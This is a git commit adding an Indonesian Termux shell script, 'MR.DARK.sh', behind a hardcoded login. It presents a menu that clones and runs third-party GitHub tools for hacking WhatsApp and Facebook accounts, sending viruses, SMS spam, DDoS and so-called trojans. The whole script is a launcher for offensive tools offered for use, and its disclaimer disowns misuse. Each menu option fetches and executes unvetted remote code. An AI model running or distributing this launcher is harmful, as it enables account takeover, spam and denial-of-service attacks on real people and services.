4503b65647560ceafcc44cf46ad87101ee9a0a31
Arisandi15 <60065358+Arisandi15@users.noreply.github.com>
2020-01-20 21:22:28 +0700

    Add files via upload

---
+++ MR.DARK.sh
@@ -0,0 +1,201 @@
+clear
+echo "
+Belajar lah menghargai orang lain :)
+
+Kami sebagai MR.DARK tidak bertanggung jawab jika script di gunakan untuk kejahatan
+
+Admin tidak bertanggung jawab jika script di gunakan untuk melanggar hukum :)
+
+kami membuat tools/script ini susah-susah cuma untuk kalian :)
+
+jadi hargai lah orang lain :)
+
+Admin membuat script yang terbaik untuk kalian :)
+
+kalian bisa donload user && pass nya di bawah ini
+
+minta tolong jangan di share biar temen kalian donload sendiri jangan manja :)
+
+kalian biasa donload di browser kalian link nya saya taruk di komen ini
+
+jika userr dan pass salah berarti Admin meng upgrade script yg lebih bagus lagi :)
+
+kalian biasa copy link di bawah ini :)
+
+link : https://www.mediafire.com/file/fm151anote8rinh/donload_userr_%26%26_pass/file
+
+selamat mendonload dan menggunkan tools kami :)" | lolcat
+
+sleep 3
+
+#usr/bin/bash
+read -p "username : " user
+if [ $user = "Sayang" ]
+then
+clear
+sleep 1
+clear
+else
+     echo "\033[31;1muserr salah"
+     echo "\033[37;1m"
+     sleep 1
+     sh MR.DARK.sh
+fi
+read -p "password : " pass
+if [ $pass = "Mantan" ]
+then
+clear
+sleep 1
+clear
+else
+     echo "\033[31;1mpassword salah"
+     echo "\033[37;1m"
+     sleep 1
+     sh MR.DARK.sh
+fi
+
+clear
+toilet -f slant --gay "Login Success"
+sleep 3
+
+clear
+toilet -f standard "TOOLS MR.DARK" -F gay
+sleep 2
+toilet -f standard "SUBSCRIBE" -F gay
+sleep 2
+toilet -f standard "Hrln.Arisandi" -F gay
+sleep 2
+echo "
+=============================
+AUTHOR  : MR.DARK
+CHANNEL : Hrln.Arisandi
+TEAM    : HSD(HACKKERSCANDARK)
+CONTACT : 081336501311
+=============================" | lolcat
+
+sleep 2
+
+echo "
+(1) HACK WA
+(2) HACK FB
+(3) KIRIM VIRUS
+(4) SPAM SMS
+(5) RED_HAWK
+(6) DDOS
+(7) DDOS TROJANS
+(8) SPAM TROJANS
+(9) INSTALL 311 TOOLS
+(00) exit" | lolcat
+echo "pilih nomer : " | lolcat
+read nomer
+
+if [ $nomer = 1 ] || [ $nomer = 02 ]
+then
+clear
+pkg install git
+pkg install curl
+git clone https://github.com/AndriGanz/whatshack
+cd whatshack
+ls
+sh whatshack.sh
+fi
+
+if [ $nomer = 2 ] || [ $nomer = 02 ]
+then
+clear
+pkg install git
+pkg install mechanize
+pkg install python2
+git clone https://github.com/pashayogi/SETAN
+cd SETAN
+ls
+python2 SETAN.py
+fi
+
+if [ $nomer = 3 ] || [ $nomer = 03 ]
+then
+clear
+pkg install git
+pkg install python2
+git clone https://github.com/justahackker/perusak
+cd perusak
+ls
+python2 perusak.py
+fi
+
+if [ $nomer = 4 ] || [ $nomer = 04 ]
+then
+clear
+pkg install git
+pkg install python2
+git clone https://github.com/Amriez/gcospam
+cd gcospam
+ls
+php telkomsel.php
+fi
+
+if [ $nomer = 5 ] || [ $nomer = 05 ]
+then
+clear
+pkg install python2
+pkg install curl
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+cd RED_HAWK
+php hawk.php
+fi
+
+if [ $nomer = 6 ] || [ $nomer = 06 ]
+then
+clear
+pkg install git
+pkg install python
+pkg install python2
+git clone https://github.com/zlucifer/lucita_ddos
+cd lucita_ddos
+chmod +x pukul.py
+python pukul.py
+fi
+
+if [ $nomer = 7 ] || [ $nomer = 07 ]
+then
+clear
+pkg install git
+pkg install python2 
+pkg install python3
+git clone https://github.com/mr-reo001-team/Trojan_MRREO
+cd Trojan_MRREO
+ls
+python3 jurusreo.py
+python2 jurusreo.py
+python jurusreo.py
+fi
+
+if [ $nomer = 8 ] || [ $nomer = 08 ]
+then
+clear
+pkg install git
+pkg install python2
+git clone https://github.com/R133f/Trojans
+cd Trojans
+ls
+python2 trojans.py
+fi
+
+if [ $nomer = 9 ] || [ $nomer = 09 ]
+then
+clear
+pkg install git
+pkg install python2
+git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv3
+cd TOOLSINSTALLERv3
+ls
+chmod +x TUANB4DUT.sh
+sh TUANB4DUT.sh
+fi
+
+if [ $nomer = 00 ] || [ $nomer = 00 ]
+then 
+clear
+echo "created by:MR.DARK" | lolcat
+exit
+fi
